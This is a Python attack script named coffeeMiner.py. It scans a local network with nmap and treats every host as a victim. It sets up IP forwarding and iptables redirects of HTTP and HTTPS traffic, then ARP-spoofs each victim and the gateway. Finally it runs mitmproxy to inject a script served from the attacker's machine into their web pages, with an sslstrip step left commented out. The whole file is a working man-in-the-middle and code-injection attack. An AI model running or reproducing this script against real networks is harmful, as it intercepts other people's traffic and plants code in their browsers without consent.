import os
import sys
import subprocess
import nmap

#check len params
if len(sys.argv) < 4:
	print("Usage python coffeeMiner.py <gateway> <network> <yourip>")
	sys.exit(0)
#get gateway_ip (router)
gateway = sys.argv[1]
#get network
network = sys.argv[2]
#get yourip
yourip = sys.argv[3]

print("gateway: " + gateway)
print("network: " + network)
print("yourip:  " + yourip)

# get victims_ip
#victims = [line.rstrip('\n') for line in open("victims.txt")]
nm = nmap.PortScanner()
nm.scan(hosts=network, arguments='-n -sP')
victims = nm.all_hosts()
victims.remove(gateway)
victims.remove(yourip)
print("victims:")
print(victims)

# configure routing (IPTABLES)
os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
os.system("iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE")
os.system("iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080")
os.system("iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port 8080")


# run the arpspoof for each victim, each one in a new console
for victim in victims:
    os.system("xterm -e arpspoof -i eth0 -t " + victim + " " + gateway + " &")
    os.system("xterm -e arpspoof -i eth0 -t " + gateway + " " + victim + " &")

# start the http server for serving the script.js, in a new console
os.system("xterm -hold -e 'python3 httpServer.py' &")

# start the mitmproxy
os.system("~/.local/bin/mitmdump -s 'injector.py http://"+yourip+":8000/script.js' -T")

'''
# run sslstrip
os.system("xterm -e sslstrip -l 8080 &")
'''
